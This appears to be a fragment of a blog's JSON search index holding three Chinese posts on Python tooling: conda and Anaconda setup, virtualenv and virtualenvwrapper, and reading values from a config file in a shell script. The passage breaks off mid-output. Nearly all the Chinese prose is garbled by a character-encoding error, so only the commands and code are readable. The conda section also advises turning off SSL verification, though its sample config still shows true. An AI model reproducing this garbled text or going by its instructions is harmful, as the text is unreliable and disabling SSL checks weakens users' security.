Windowsç³»ç»Ÿï¼Œæä¾›äº†åŒ…ç®¡ç†ä¸ç¯å¢ƒç®¡ç†çš„åŠŸèƒ½ï¼Œå¯ä»¥å¾ˆæ–¹ä¾¿åœ°è§£å†³å¤šç‰ˆæœ¬pythonå¹¶å­˜ã€åˆ‡æ¢ä»¥åŠå„ç§ç¬¬ä¸‰æ–¹åŒ…å®‰è£…é—®é¢˜ã€‚anaconda åˆ©ç”¨å·¥å…·/å‘½ä»¤ conda æ¥è¿›è¡Œ package å’Œ environment çš„ç®¡ç†ï¼Œå¹¶ä¸”å·²ç»åŒ…å«äº†Pythonå’Œç›¸å…³çš„é…å¥—å·¥å…·ã€‚\n\n\n\nè¿™é‡Œå…ˆè§£é‡Šä¸‹condaã€anacondaè¿™äº›æ¦‚å¿µçš„å·®åˆ«ï¼Œè¯¦ç»†å·®åˆ«è§ä¸‹èŠ‚ã€‚\n\n1. ##### anaconda\n\nanaconda åˆ™æ˜¯ä¸€ä¸ªæ‰“åŒ…çš„é›†åˆï¼Œé‡Œé¢é¢„è£…å¥½äº† condaã€æŸä¸ªç‰ˆæœ¬çš„pythonã€ä¼—å¤špackagesã€ç§‘å­¦è®¡ç®—å·¥å…·ç­‰ç­‰ï¼Œæ‰€ä»¥ä¹Ÿç§°ä¸ºPythonçš„ä¸€ç§å‘è¡Œç‰ˆã€‚å…¶å®è¿˜æœ‰Minicondaï¼Œé¡¾åæ€ä¹‰ï¼Œå®ƒåªåŒ…å«æœ€åŸºæœ¬çš„å†…å®¹â€”â€”pythonä¸condaï¼Œä»¥åŠç›¸å…³çš„å¿…é¡»ä¾èµ–é¡¹ï¼Œå¯¹äºç©ºé—´è¦æ±‚ä¸¥æ ¼çš„ç”¨æˆ·ï¼ŒMinicondaæ˜¯ä¸€ç§é€‰æ‹©ã€‚\n\n<!-- more -->\n\n2. ##### conda\n\nconda å¯ä»¥ç†è§£ä¸ºä¸€ä¸ªå·¥å…·ï¼Œä¹Ÿæ˜¯ä¸€ä¸ªå¯æ‰§è¡Œå‘½ä»¤ï¼Œå…¶æ ¸å¿ƒåŠŸèƒ½æ˜¯`åŒ…ç®¡ç†`ä¸`ç¯å¢ƒç®¡ç†`ã€‚ åŒ…ç®¡ç†ä¸pipçš„ä½¿ç”¨ç±»ä¼¼ï¼Œç¯å¢ƒç®¡ç†åˆ™å…è®¸ç”¨æˆ·æ–¹ä¾¿åœ°å®‰è£…ä¸åŒç‰ˆæœ¬çš„pythonå¹¶å¯ä»¥å¿«é€Ÿåˆ‡æ¢ã€‚\n\n\n\nè¿›å…¥ä¸‹æ–‡ä¹‹å‰ï¼Œè¯´æ˜ä¸€ä¸‹condaçš„è®¾è®¡ç†å¿µâ€”â€”**condaå°†å‡ ä¹æ‰€æœ‰çš„å·¥å…·ã€ç¬¬ä¸‰æ–¹åŒ…éƒ½å½“åšpackageå¯¹å¾…ï¼Œç”šè‡³åŒ…æ‹¬pythonå’Œcondaè‡ªèº«**ï¼å› æ­¤ï¼Œcondaæ‰“ç ´äº†åŒ…ç®¡ç†ä¸ç¯å¢ƒç®¡ç†çš„çº¦æŸï¼Œèƒ½éå¸¸æ–¹ä¾¿åœ°å®‰è£…å„ç§ç‰ˆæœ¬pythonã€å„ç§packageå¹¶æ–¹ä¾¿åœ°åˆ‡æ¢ã€‚\n\n\n\n\n\n### 1. anacondaã€condaã€pipã€virtualenvçš„åŒºåˆ«\n\n**1. anaconda**\n\nanacondaæ˜¯ä¸€ä¸ªåŒ…å«180+çš„ç§‘å­¦åŒ…åŠå…¶ä¾èµ–é¡¹çš„å‘è¡Œç‰ˆæœ¬ã€‚å…¶åŒ…å«çš„ç§‘å­¦åŒ…åŒ…æ‹¬ï¼šconda, numpy, scipy, ipython notebookç­‰ã€‚\n\n**2. conda**\n\ncondaæ˜¯åŒ…åŠå…¶ä¾èµ–é¡¹å’Œç¯å¢ƒçš„ç®¡ç†å·¥å…·ã€‚\n\n+ é€‚ç”¨è¯­è¨€ï¼šPython, R, Ruby, Lua, Scala, Java, JavaScript, C/C++, FORTRANã€‚\n+ é€‚ç”¨å¹³å°ï¼šWindows, macOS, Linux\n+ ç”¨é€”ï¼šå¿«é€Ÿå®‰è£…ã€è¿è¡Œå’Œå‡çº§åŒ…åŠå…¶ä¾èµ–é¡¹ï¼›åœ¨è®¡ç®—æœºä¸­ä¾¿æ·åœ°åˆ›å»ºã€ä¿å­˜ã€åŠ è½½å’Œåˆ‡æ¢ç¯å¢ƒã€‚\n\nå¦‚æœä½ éœ€è¦çš„åŒ…è¦æ±‚ä¸åŒç‰ˆæœ¬çš„Pythonï¼Œä½ æ— éœ€åˆ‡æ¢åˆ°ä¸åŒçš„ç¯å¢ƒï¼Œå› ä¸ºcondaåŒæ ·æ˜¯ä¸€ä¸ªç¯å¢ƒç®¡ç†å™¨ã€‚ä»…éœ€è¦å‡ æ¡å‘½ä»¤ï¼Œä½ å¯ä»¥åˆ›å»ºä¸€ä¸ªå®Œå…¨ç‹¬ç«‹çš„ç¯å¢ƒæ¥è¿è¡Œä¸åŒçš„Pythonç‰ˆæœ¬ï¼ŒåŒæ—¶ç»§ç»­åœ¨ä½ å¸¸è§„çš„ç¯å¢ƒä¸­ä½¿ç”¨ä½ å¸¸ç”¨çš„Pythonç‰ˆæœ¬ã€‚\n\n+ condaä¸ºPythoné¡¹ç›®è€Œåˆ›é€ ï¼Œä½†å¯é€‚ç”¨äºä¸Šè¿°çš„å¤šç§è¯­è¨€ã€‚\n+ condaåŒ…å’Œç¯å¢ƒç®¡ç†å™¨åŒ…å«äºanacondaçš„æ‰€æœ‰ç‰ˆæœ¬å½“ä¸­ã€‚\n\n**3. pip**\n\n+ pipæ˜¯ç”¨äºå®‰è£…å’Œç®¡ç†è½¯ä»¶åŒ…çš„åŒ…ç®¡ç†å™¨ã€‚\n+ pipç¼–å†™è¯­è¨€ï¼šPythonã€‚\n+ Pythonä¸­é»˜è®¤å®‰è£…çš„ç‰ˆæœ¬ï¼š\n\nPython 2.7.9åŠåç»­ç‰ˆæœ¬ï¼šé»˜è®¤å®‰è£…ï¼Œå‘½ä»¤ä¸ºpip\nPython 3.4åŠåç»­ç‰ˆæœ¬ï¼šé»˜è®¤å®‰è£…ï¼Œå‘½ä»¤ä¸ºpip3\n\n\n\n**4. virtualenv**\n\nç”¨äºåˆ›å»ºä¸€ä¸ªç‹¬ç«‹çš„Pythonç¯å¢ƒçš„å·¥å…·ã€‚è§£å†³é—®é¢˜ï¼š\n1. å½“ä¸€ä¸ªç¨‹åºéœ€è¦ä½¿ç”¨Python 2.7ç‰ˆæœ¬ï¼Œè€Œå¦ä¸€ä¸ªç¨‹åºéœ€è¦ä½¿ç”¨Python 3.6ç‰ˆæœ¬ï¼Œå¦‚ä½•åŒæ—¶ä½¿ç”¨è¿™ä¸¤ä¸ªç¨‹åºï¼Ÿ\n2. å¦‚æœå°†æ‰€æœ‰ç¨‹åºéƒ½å®‰è£…åœ¨ç³»ç»Ÿä¸‹çš„é»˜è®¤è·¯å¾„ï¼Œå¦‚ï¼š/usr/lib/python2.7/site-packagesï¼Œå½“ä¸å°å¿ƒå‡çº§äº†æœ¬ä¸è¯¥å‡çº§çš„ç¨‹åºæ—¶ï¼Œå°†ä¼šå¯¹å…¶ä»–çš„ç¨‹åºé€ æˆå½±å“ã€‚\n3. å¦‚æœæƒ³è¦å®‰è£…ç¨‹åºå¹¶åœ¨ç¨‹åºè¿è¡Œæ—¶å¯¹å…¶åº“æˆ–åº“çš„ç‰ˆæœ¬è¿›è¡Œä¿®æ”¹ï¼Œéƒ½ä¼šå¯¼è‡´ç¨‹åºçš„ä¸­æ–­ã€‚\n4. åœ¨å…±äº«ä¸»æœºæ—¶ï¼Œæ— æ³•åœ¨å…¨å±€site-packagesç›®å½•ä¸­å®‰è£…åŒ…ã€‚\n\nvirtualenvå°†ä¼šä¸ºå®ƒè‡ªå·±çš„å®‰è£…ç›®å½•åˆ›å»ºä¸€ä¸ªç¯å¢ƒï¼Œè¿™å¹¶ä¸ä¸å…¶ä»–virtualenvç¯å¢ƒå…±äº«åº“ï¼›åŒæ—¶ä¹Ÿå¯ä»¥é€‰æ‹©æ€§åœ°ä¸è¿æ¥å·²å®‰è£…çš„å…¨å±€åº“ã€‚\n\n\n\n### 2. pip ä¸ conda æ¯”è¾ƒ\n\n1. ä¾èµ–é¡¹æ£€æŸ¥\n\n   pipï¼š1. ä¸ä¸€å®šä¼šå±•ç¤ºæ‰€éœ€å…¶ä»–ä¾èµ–åŒ…ã€‚2. å®‰è£…åŒ…æ—¶æˆ–è®¸ä¼šç›´æ¥å¿½ç•¥ä¾èµ–é¡¹è€Œå®‰è£…ï¼Œä»…åœ¨ç»“æœä¸­æç¤ºé”™è¯¯ã€‚\n\n   condaï¼š1. åˆ—å‡ºæ‰€éœ€å…¶ä»–ä¾èµ–åŒ…ã€‚2. å®‰è£…åŒ…æ—¶è‡ªåŠ¨å®‰è£…å…¶ä¾èµ–é¡¹ã€‚3. å¯ä»¥ä¾¿æ·åœ°åœ¨åŒ…çš„ä¸åŒç‰ˆæœ¬ä¸­è‡ªç”±åˆ‡æ¢ã€‚\n\n   \n\n2. ç¯å¢ƒç®¡ç†\n\n   pipï¼šç»´æŠ¤å¤šä¸ªç¯å¢ƒéš¾åº¦è¾ƒå¤§ã€‚\n   condaï¼šæ¯”è¾ƒæ–¹ä¾¿åœ°åœ¨ä¸åŒç¯å¢ƒä¹‹é—´è¿›è¡Œåˆ‡æ¢ï¼Œç¯å¢ƒç®¡ç†è¾ƒä¸ºç®€å•ã€‚\n\n  \n\n3. å¯¹ç³»ç»Ÿè‡ªå¸¦Pythonçš„å½±å“\n\n   pipï¼šåœ¨ç³»ç»Ÿè‡ªå¸¦çš„PythonåŒ…ä¸­ æ›´æ–°/å›é€€ç‰ˆæœ¬/å¸è½½ å°†å½±å“å…¶ä»–ç¨‹åºã€‚\n   condaï¼šä¸ä¼šå½±å“ç³»ç»Ÿè‡ªå¸¦Pythonã€‚\n\n  \n\n4. é€‚ç”¨è¯­è¨€\n\n   pipï¼šä»…é€‚ç”¨äºPythonã€‚\n   condaï¼šé€‚ç”¨äºPython, R, Ruby, Lua, Scala, Java, JavaScript, C/C++, FORTRANã€‚\n\n\n\n### 3. condaä¸pipã€virtualenvçš„å…³ç³»\n\ncondaç»“åˆäº†pipå’Œvirtualenvçš„åŠŸèƒ½ã€‚\n\n\n\n### 4. anacondaçš„å®‰è£…å’Œä½¿ç”¨\n\n\n\n**1. ä¸‹è½½å®‰è£…anaconda**  \n\nä¸‹è½½é“¾æ¥: https://www.anaconda.com/distribution/#download-section\n\nå‚»ç“œå®‰è£…å, anacondaä¼šæŠŠç³»ç»ŸPathä¸­çš„pythonæŒ‡å‘è‡ªå·±è‡ªå¸¦çš„Pythonï¼Œå¹¶ä¸”Anacondaå®‰è£…çš„ç¬¬ä¸‰æ–¹æ¨¡å—ä¼šå®‰è£…åœ¨Anacondaè‡ªå·±çš„è·¯å¾„ä¸‹ï¼Œä¸å½±å“ç³»ç»Ÿå·²å®‰è£…çš„Pythonç›®å½•ã€‚\n\n```shell\nwhich python3\n/Users/liuwei/anaconda3/bin/python3\n```\n\nå®‰è£…æˆåŠŸååœ¨åº”ç”¨ç¨‹åºé‡Œæ‰“å¼€ `Anaconda Navigator`ï¼Œä¼šå±•ç¤ºå‡ºå·²ç»å®‰è£…å¥½çš„å…¶ä»–å¸¸ç”¨åº”ç”¨ï¼Œå¦‚ï¼š\n\n![1](pythonåŒ…ç®¡ç†å™¨anacondaä»‹ç»å®‰è£…å’Œä½¿ç”¨/1.png)\n\n+ Anaconda Navigtor ï¼šç”¨äºç®¡ç†å·¥å…·åŒ…å’Œç¯å¢ƒçš„å›¾å½¢ç”¨æˆ·ç•Œé¢ï¼Œåç»­æ¶‰åŠçš„ä¼—å¤šç®¡ç†å‘½ä»¤ä¹Ÿå¯ä»¥åœ¨ Navigator ä¸­æ‰‹å·¥å®ç°ã€‚\n\n+ Jupyter notebook ï¼šåŸºäºwebçš„äº¤äº’å¼è®¡ç®—ç¯å¢ƒï¼Œå¯ä»¥ç¼–è¾‘æ˜“äºäººä»¬é˜…è¯»çš„æ–‡æ¡£ï¼Œç”¨äºå±•ç¤ºæ•°æ®åˆ†æçš„è¿‡ç¨‹ã€‚\n\n+ qtconsole ï¼šä¸€ä¸ªå¯æ‰§è¡Œ IPython çš„ä»¿ç»ˆç«¯å›¾å½¢ç•Œé¢ç¨‹åºï¼Œç›¸æ¯” Python Shell ç•Œé¢ï¼Œqtconsole å¯ä»¥ç›´æ¥æ˜¾ç¤ºä»£ç ç”Ÿæˆçš„å›¾å½¢ï¼Œå®ç°å¤šè¡Œä»£ç è¾“å…¥æ‰§è¡Œï¼Œä»¥åŠå†…ç½®è®¸å¤šæœ‰ç”¨çš„åŠŸèƒ½å’Œå‡½æ•°ã€‚\n\n+ spyder ï¼šä¸€ä¸ªä½¿ç”¨Pythonè¯­è¨€ã€è·¨å¹³å°çš„ã€ç§‘å­¦è¿ç®—é›†æˆå¼€å‘ç¯å¢ƒã€‚\n\n\n\n**2. å®‰è£…ååœ¨ç»ˆç«¯è¾“å…¥conda æ— æ³•è¯†åˆ«è¿™ä¸ªå‘½ä»¤:**\n\n```shell\nexport PATH=\"${HOME}/anaconda3/bin:$PATH\"\n```\n\n\n\n**3. ä¿®æ”¹condaé•œåƒæº:**\n\nå¦‚ä¸ä¿®æ”¹condaçš„é•œåƒæºï¼Œ99.99%ä¼šæŠ¥httpé“¾æ¥å¤±è´¥çš„é”™è¯¯ï¼ˆç½‘å‹è¸©å‘ç»éªŒï¼‰ã€‚\n\nè¾“å…¥ä»¥ä¸‹ä¸¤æ¡å‘½ä»¤æ¥æ·»åŠ æ¸…åæºï¼š\n\n```shell\nconda config --add channels https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/free/ \nconda config --set show_channel_urls yes\n```\n\nåœ¨å®¶ç›®å½•ä¸‹ä¼šç”Ÿæˆ`.condarc`æ–‡ä»¶, ç„¶åæŠŠssl_verfiyæ”¹ä¸ºfalse,\n\n```\nssl_verify: true\nchannels:\n  - https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/free/\n  - defaults\nshow_channel_urls: true\n```\n\n\n\nç„¶åç”¨ conda info æŸ¥çœ‹å½“å‰é…ç½®ä¿¡æ¯ï¼Œchannel URLs å­—æ®µå†…å®¹å˜ä¸ºæ¸…åå³ä¿®æ”¹æˆåŠŸã€‚\n\n\n\n### 5. anaconda pythonç¯å¢ƒçš„åˆ›å»ºå’Œåˆ‡æ¢\n\n+ å¯ä»¥åœ¨`anaconda-navigator`åˆ›å»ºæ–°çš„ç¯å¢ƒ\n\n  ![1](pythonåŒ…ç®¡ç†å™¨anacondaä»‹ç»å®‰è£…å’Œä½¿ç”¨/2.png)\n\n\n\n ä¹Ÿå¯ä»¥å‘½ä»¤è¡Œåˆ›å»º:\n\n```shell\nconda create -n py27 python=2.7 æˆ– conda create --name py27 python=2.7\n```\n\n\n\n+ ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤ï¼ŒæŸ¥çœ‹å½“å‰æœ‰å“ªäº›ç¯å¢ƒï¼š\n\n```shell\nconda info -e\n\nWARNING: The conda.compat module is deprecated and will be removed in a future release.\n\n# conda environments:\n#\nbase                  *  /Users/liuwei/anaconda3\npy27                     /Users/liuwei/anaconda3/envs/py27\n```\n\næ˜Ÿå·è¡¨ç¤ºå½“å‰æ¿€æ´»çš„ç¯å¢ƒã€‚\n\n\n\n+ æ¿€æ´»py27ç¯å¢ƒï¼š\n\n```shell\nsource activate py27 \næˆ– \nconda activate py27\n```\n\n\n\nè¿™æ—¶å€™çœ‹python, å·²ç»é“¾æ¥åˆ°py27äº†\n\n```shell\nwhich python\n\n/Users/liuwei/anaconda3/envs/py27/bin/python\n```\n\n\n\n+ é€€å‡ºå½“å‰ç¯å¢ƒ\n\n```shell\nconda deactivate \næˆ– \nsource deactivate\n```\n\n\n\n+ æŸ¥çœ‹å®‰è£…äº†å“ªäº›åŒ…\n\n```shell\nconda list\n```\n\n ä»¥åå¯ä»¥é€šè¿‡`anaconda-navigator`åœ¨æŒ‡å®šç¯å¢ƒä¸‹å®‰è£…åŒ…\n\n![1](pythonåŒ…ç®¡ç†å™¨anacondaä»‹ç»å®‰è£…å’Œä½¿ç”¨/4.png)\n\n\n\n### 6. é…ç½®pycharmä½¿ç”¨anacondaç¯å¢ƒ\n\nåœ¨`Project Interpreter` å¢åŠ  virtualenvsçš„ç‰¹å®šç¯å¢ƒä¸‹çš„æ‰§è¡Œç¨‹åº\n\n![1](pythonåŒ…ç®¡ç†å™¨anacondaä»‹ç»å®‰è£…å’Œä½¿ç”¨/3.png)\n\n\n\n\n\n### 7. å¸¸ç”¨å‘½ä»¤æ€»ç»“\n\n```bash\nconda info -e  # æŸ¥çœ‹æœ‰å“ªäº›ç¯å¢ƒ\nconda create --name py27 python=2.7 # åˆ›å»ºä¸€ä¸ªç¯å¢ƒ\nconda env remove --name py37 # åˆ é™¤ä¸€ä¸ªç¯å¢ƒ\nconda activate py27 # æ¿€æ´»æŸä¸ªç¯å¢ƒ\nconda deactivate  #é€€å‡ºå½“å‰ç¯å¢ƒ\nconda list # æŸ¥çœ‹å®‰è£…äº†å“ªäº›åŒ…\n\n# conda é‡Œé›†æˆ pip, ä»¥é˜² conda æ²¡æœ‰çš„åŒ…, é€šè¿‡ pip æ¥å®‰è£…\nconda install pip\n\nwhich pip\n/Users/liuwei/anaconda3/bin/pip\n\npip install xxx\n```\n\n","tags":["anaconda"],"categories":["python"]},{"title":"pythonéš”ç¦»ç¯å¢ƒvirtualenvå’Œvirtualenvwrapperçš„ä½¿ç”¨","url":"%2Fp%2F8731aeb9.html","content":"\n\n\nå¦‚æœæˆ‘ä»¬è¦åŒæ—¶å¼€å‘å¤šä¸ªåº”ç”¨ç¨‹åºï¼Œé‚£è¿™äº›åº”ç”¨ç¨‹åºéƒ½ä¼šå…±ç”¨ä¸€ä¸ªPythonï¼Œå°±æ˜¯å®‰è£…åœ¨ç³»ç»Ÿçš„Python 3ã€‚å¦‚æœåº”ç”¨Aéœ€è¦jinja 2.7ï¼Œè€Œåº”ç”¨Béœ€è¦jinja 2.6æ€ä¹ˆåŠï¼Ÿ\n\nè¿™ç§æƒ…å†µä¸‹ï¼Œæ¯ä¸ªåº”ç”¨å¯èƒ½éœ€è¦å„è‡ªæ‹¥æœ‰ä¸€å¥—â€œç‹¬ç«‹â€çš„Pythonè¿è¡Œç¯å¢ƒã€‚virtualenvå°±æ˜¯ç”¨æ¥ä¸ºä¸€ä¸ªåº”ç”¨åˆ›å»ºä¸€å¥—â€œéš”ç¦»â€çš„Pythonè¿è¡Œç¯å¢ƒã€‚\n\n\n\n### 1. å®‰è£…ä½¿ç”¨virtualenv(æ¨èä½¿ç”¨virtualenvwrapper)\n\né¦–å…ˆï¼Œæˆ‘ä»¬ç”¨pipå®‰è£…virtualenvï¼š\n\n```shell\nsudo pip3 install virtualenv\n```\n\nç„¶åï¼Œå‡å®šæˆ‘ä»¬è¦å¼€å‘ä¸€ä¸ªæ–°çš„é¡¹ç›®ï¼Œéœ€è¦ä¸€å¥—ç‹¬ç«‹çš„Pythonè¿è¡Œç¯å¢ƒï¼Œå¯ä»¥è¿™ä¹ˆåšï¼š\n\n\n\n<!-- more -->\n\n+ ç¬¬ä¸€æ­¥ï¼Œåˆ›å»ºç›®å½•ï¼š\n\n```shell\nmkdir myproject\ncd myproject/\n```\n\n\n\n+ ç¬¬äºŒæ­¥ï¼Œåˆ›å»ºä¸€ä¸ªç‹¬ç«‹çš„Pythonè¿è¡Œç¯å¢ƒï¼Œå‘½åä¸ºvenvï¼š\n\n```shell\nvirtualenv --no-site-packages venv\n\nvirtualenv -p /Library/Frameworks/Python.framework/Versions/3.7/bin/python3 --no-site-packages venv  # æŒ‡å®šç‰¹å®šçš„ç‰ˆæœ¬åˆ›å»ºéš”ç¦»ç¯å¢ƒ\n```\n\n\n\nå‘½ä»¤virtualenvå°±å¯ä»¥åˆ›å»ºä¸€ä¸ªç‹¬ç«‹çš„Pythonè¿è¡Œç¯å¢ƒï¼Œæˆ‘ä»¬è¿˜åŠ ä¸Šäº†å‚æ•°--no-site-packagesï¼Œè¿™æ ·ï¼Œå·²ç»å®‰è£…åˆ°ç³»ç»ŸPythonç¯å¢ƒä¸­çš„æ‰€æœ‰ç¬¬ä¸‰æ–¹åŒ…éƒ½ä¸ä¼šå¤åˆ¶è¿‡æ¥ï¼Œè¿™æ ·ï¼Œæˆ‘ä»¬å°±å¾—åˆ°äº†ä¸€ä¸ªä¸å¸¦ä»»ä½•ç¬¬ä¸‰æ–¹åŒ…çš„â€œå¹²å‡€â€çš„Pythonè¿è¡Œç¯å¢ƒã€‚\n\n\n\n+ ç¬¬ä¸‰æ­¥, æ–°å»ºçš„Pythonç¯å¢ƒè¢«æ”¾åˆ°å½“å‰ç›®å½•ä¸‹çš„venvç›®å½•ã€‚æœ‰äº†venvè¿™ä¸ªPythonç¯å¢ƒï¼Œå¯ä»¥ç”¨sourceè¿›å…¥è¯¥ç¯å¢ƒï¼š\n\n```shell\nsource venv/bin/activate\næˆ–\n. venv/bin/activate\n```\n\næ³¨æ„åˆ°å‘½ä»¤æç¤ºç¬¦å˜äº†ï¼Œæœ‰ä¸ª(venv)å‰ç¼€ï¼Œè¡¨ç¤ºå½“å‰ç¯å¢ƒæ˜¯ä¸€ä¸ªåä¸ºvenvçš„Pythonç¯å¢ƒã€‚ \n\nï¼ˆmac iterm2+zshä¸‹ä¼šå‡ºç°èŸ’è›‡å“¦, å³pythonçš„logoï¼‰\n\n\n\nåœ¨venvç¯å¢ƒä¸‹ï¼Œç”¨pipå®‰è£…çš„åŒ…éƒ½è¢«å®‰è£…åˆ°venvè¿™ä¸ªç¯å¢ƒä¸‹ï¼Œç³»ç»ŸPythonç¯å¢ƒä¸å—ä»»ä½•å½±å“ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œvenvç¯å¢ƒæ˜¯ä¸“é—¨é’ˆå¯¹myprojectè¿™ä¸ªåº”ç”¨åˆ›å»ºçš„ã€‚\n\n\n\n+ ç¬¬å››æ­¥, é€€å‡ºå½“å‰çš„venvç¯å¢ƒï¼Œä½¿ç”¨deactivateå‘½ä»¤ï¼š\n\n```shell\ndeactivate\n```\n\næ­¤æ—¶å°±å›åˆ°äº†æ­£å¸¸çš„ç¯å¢ƒï¼Œç°åœ¨pipæˆ–pythonå‡æ˜¯åœ¨ç³»ç»ŸPythonç¯å¢ƒä¸‹æ‰§è¡Œã€‚\n\nå®Œå…¨å¯ä»¥é’ˆå¯¹æ¯ä¸ªåº”ç”¨åˆ›å»ºç‹¬ç«‹çš„Pythonè¿è¡Œç¯å¢ƒï¼Œè¿™æ ·å°±å¯ä»¥å¯¹æ¯ä¸ªåº”ç”¨çš„Pythonç¯å¢ƒè¿›è¡Œéš”ç¦»ã€‚\n\n\n\nvirtualenvæ˜¯å¦‚ä½•åˆ›å»ºâ€œç‹¬ç«‹â€çš„Pythonè¿è¡Œç¯å¢ƒçš„å‘¢ï¼ŸåŸç†å¾ˆç®€å•ï¼Œå°±æ˜¯æŠŠç³»ç»ŸPythonå¤åˆ¶ä¸€ä»½åˆ°virtualenvçš„ç¯å¢ƒï¼Œç”¨å‘½ä»¤`source venv/bin/activate`è¿›å…¥ä¸€ä¸ªvirtualenvç¯å¢ƒæ—¶ï¼Œvirtualenvä¼šä¿®æ”¹ç›¸å…³ç¯å¢ƒå˜é‡ï¼Œè®©å‘½ä»¤pythonå’Œpipå‡æŒ‡å‘å½“å‰çš„virtualenvç¯å¢ƒã€‚\n\nvirtualenvä¸ºåº”ç”¨æä¾›äº†éš”ç¦»çš„Pythonè¿è¡Œç¯å¢ƒï¼Œè§£å†³äº†ä¸åŒåº”ç”¨é—´å¤šç‰ˆæœ¬çš„å†²çªé—®é¢˜ã€‚\n\n\n\n\n\n### 2. å®‰è£…virtualenvwrapper\n\nvirtualenvéœ€è¦æ¯æ¬¡ä½¿ç”¨sourceå‘½ä»¤å¯¼å…¥è™šæ‹Ÿæœºè¿è¡Œç¯å¢ƒï¼Œè¿™ä¸€ç‚¹éå¸¸éº»çƒ¦ï¼Œå¦å¤–å¼€å‘è€…è¿˜æœ‰å¯èƒ½å¿˜è®°è™šæ‹Ÿç¯å¢ƒç›®å½•çš„å»ºç«‹ä½ç½®ï¼Œvirtualenvwrapperè¿™ä¸€å‘½ä»¤è¡Œå·¥å…·å°±æ˜¯é€šè¿‡å¯¹virtualenvè¿›è¡Œå°è£…ï¼Œè§£å†³äº†ä¸Šè¿°é—®é¢˜\n\n\n\né¦–å…ˆæ˜¯å®‰è£…:\n\n```shell\nsudo pip3 isntall virtualenvwrapper\n```\n\n\n\nå®‰è£…åæŸ¥æ‰¾virtualenvwrapper.sh:\n\n```shell\nwhich virtualenvwrapper.sh \n\n/Library/Frameworks/Python.framework/Versions/3.7/bin/virtualenvwrapper.sh\n```\n\n\n\nç„¶åä¿®æ”¹ç¯å¢ƒå˜é‡é…ç½® `.zshrc`:\n\n```shell\nexport WORKON_HOME=$HOME/virtualenvs \n\nexport VIRTUALENVWRAPPER_SCRIPT=/Library/Frameworks/Python.framework/Versions/3.7/bin/virtualenvwrapper.sh \n\nexport VIRTUALENVWRAPPER_PYTHON=/Library/Frameworks/Python.framework/Versions/3.7/bin/python3 \n\nexport VIRTUALENVWRAPPER_VIRTUALENV=/Library/Frameworks/Python.framework/Versions/3.7/bin/virtualenv \n\nexport VIRTUALENVWRAPPER_VIRTUALENV_ARGS='--no-site-packages' \n\nsource /Library/Frameworks/Python.framework/Versions/3.7/bin/virtualenvwrapper.sh \n```\n\n\n\nä¸­é—´çš„4è¡Œå’Œä½ æœ¬æœºçš„pythonç‰ˆæœ¬å’Œè·¯å¾„è¦ä¿æŒä¸€è‡´ï¼Œæ­¤å¤„æ³¨æ„å¦‚æœä¸åŠ ä¸Šé¢ä¸­é—´4è¡Œï¼Œåˆ™ä¼šå‡ºç°ä¸‹é¢çš„é”™è¯¯ï¼š\n\n```shell\n/usr/bin/python: No module named virtualenvwrapper\n```\n\nè‡³æ­¤å¤§åŠŸå‘Šæˆï¼Œå¯ä»¥æ–¹ä¾¿çš„ä½¿ç”¨virtualenvwrapperäº†ã€‚\n\n\n\n\n\n### 3. ä½¿ç”¨virtualenvwrapper\n\n\n\nåˆ›å»ºè™šæ‹Ÿç¯å¢ƒ:\n\n```shell\nmkvirtualenv newenv  \n```\n\n\n\nè¿™æ ·å°±å»ºç«‹äº†ä¸€ä¸ªè™šæ‹Ÿçš„è¿è¡Œç¯å¢ƒï¼Œè€Œä¸”ä¸€å¼€å§‹å°±å¤„äºæ¿€æ´»çŠ¶æ€ï¼Œä½†çœ‹ä¸åˆ°newenvç›®å½•ï¼Œå…¶å®virtualenvwrapperå¯¹è™šæ‹Ÿæœºç¯å¢ƒä½œäº†ç»Ÿä¸€çš„ç®¡ç†ï¼Œæ ¹æ®ä¸Šé¢é…ç½®çš„ç¯å¢ƒå˜é‡WORK_HOMEçš„è·¯å¾„ä¿¡æ¯ï¼Œåœ¨å…¶ä¸­å»ºç«‹äº†è™šæ‹Ÿè¿è¡Œç¯å¢ƒç›®å½•.\n\n\n\nå…¶ä»–æœ‰ç”¨çš„å‘½ä»¤:\n\n- workon: æ‰“å°æ‰€æœ‰çš„è™šæ‹Ÿç¯å¢ƒï¼›\n- mkvirtualenv xxx: åˆ›å»º xxx è™šæ‹Ÿç¯å¢ƒ;\n- workon xxx: ä½¿ç”¨ xxx è™šæ‹Ÿç¯å¢ƒ;\n- deactivate: é€€å‡º xxx è™šæ‹Ÿç¯å¢ƒï¼›\n- rmvirtualenv xxx: åˆ é™¤ xxx è™šæ‹Ÿç¯å¢ƒã€‚\n\n\n\n\n\n### 4. é…ç½®pycharmä½¿ç”¨éš”ç¦»ç¯å¢ƒ\n\nåœ¨`Project Interpreter` å¢åŠ  virtualenvsçš„ç‰¹å®šç¯å¢ƒä¸‹çš„æ‰§è¡Œç¨‹åº\n\n![1](pythonéš”ç¦»ç¯å¢ƒvirtualenvå’Œvirtualenvwrapperçš„ä½¿ç”¨/1.png)","tags":["virtualenv"],"categories":["python"]},{"title":"shellè¯»å–æ–‡ä»¶å†…å®¹é‡åˆ°çš„å‘","url":"%2Fp%2F67723314.html","content":"\næ–‡ä»¶å†…å®¹å¦‚ä¸‹, éœ€è¦æŠŠ1234è¯»å–èµ‹å€¼ç»™shellå†…éƒ¨çš„å˜é‡nodeid\n\n```\ncat a.conf\nnodeid 1234\n```\n\n<!-- more -->\n\nshellè§£ææ–‡ä»¶å¦‚ä¸‹\n\n```shell\n#!/bin/sh\n\nnodeid=0\n\n\nset_nodeid1(){\n\tcat a.conf | while read line\n\tdo\n\t\tif [[ $line == nodeid* ]];\n\t\tthen\n\t\t\t nodeid=${line:7}\n\t\tfi\n\tdone\n}\n\nset_nodeid2(){\n\tfor line in `cat a.conf`\n\tdo\n\t\tif [[ $line == nodeid* ]];\n\t\tthen\n\t\t\t nodeid=${line:7}\n\t\tfi\n\tdone\n}\n\nset_nodeid3(){\n\twhile read -r line\n\tdo\n\t\tif [[ $line == nodeid* ]];\n\t\tthen\n\t\t\t nodeid=${line:7}\n\t\tfi\n\tdone < a.conf\n}\n\n\nset_nodeid1\necho \"set_nodeid1 is $nodeid\"\nset_nodeid2\necho \"set_nodeid2 is $nodeid\"\nset_nodeid3\necho \"set_nodeid3 is $nodeid\"\n```\n\n\n\nè¾“å‡ºå†…å®¹å¦‚ä¸‹:\n\n```bash\nset_nodeid1 is 0\nset_nodeid2 